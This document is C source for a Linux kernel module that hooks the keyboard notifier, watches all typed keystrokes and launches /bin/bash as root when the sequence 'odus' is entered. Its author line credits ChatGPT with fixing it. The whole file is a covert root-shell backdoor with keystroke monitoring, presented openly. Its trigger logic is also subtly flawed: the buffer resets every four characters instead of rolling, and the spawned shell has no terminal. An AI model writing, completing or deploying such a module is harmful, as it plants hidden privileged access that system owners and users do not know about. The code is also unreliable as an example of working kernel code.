#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/kmod.h>
#include <linux/string.h>

#define TRIGGER "odus"
#define TRIGGER_LEN 4

/* rolling buffer with NUL terminator */
static char seq[TRIGGER_LEN + 1];
static int pos;

/* keyboard notifier callback */
static int my_kb_notifier(struct notifier_block *nb,
                          unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;

    /* we only care about key‑down events that produced a keysym */
    if (action != KBD_KEYSYM || !param->down)
        return NOTIFY_OK;

    /* filter non‑printable characters */
    if (param->value < 32 || param->value > 126)
        return NOTIFY_OK;

    /* accumulate into rolling buffer */
    seq[pos++] = (char)param->value;
    if (pos == TRIGGER_LEN) {
        seq[TRIGGER_LEN] = '\0';
        if (strcmp(seq, TRIGGER) == 0) {
            /* launch /bin/bash when the sequence matches */
            static char *argv[] = { "/bin/bash", NULL };
            static char *envp[] = { "HOME=/", "TERM=linux", NULL };
            int err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
            if (err)
                pr_err("odusmod: call_usermodehelper failed (%d)\n", err);
        }
        pos = 0; /* restart sequence */
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = my_kb_notifier,
};

static int __init mod_init(void)
{
    int ret;

    pos = 0;
    ret = register_keyboard_notifier(&nb);
    if (ret)
        pr_err("odusmod: failed to register keyboard notifier (%d)\n", ret);
    else
        pr_info("odusmod: loaded, waiting for \"%s\"\n", TRIGGER);

    return ret;
}

static void __exit mod_exit(void)
{
    unregister_keyboard_notifier(&nb);
    pr_info("odusmod: unloaded\n");
}

module_init(mod_init);
module_exit(mod_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sudo John Sudo (fixed by ChatGPT)");
MODULE_DESCRIPTION("Kernel module waiting for keyboard sequence \"odus\" and starting /bin/bash as root");
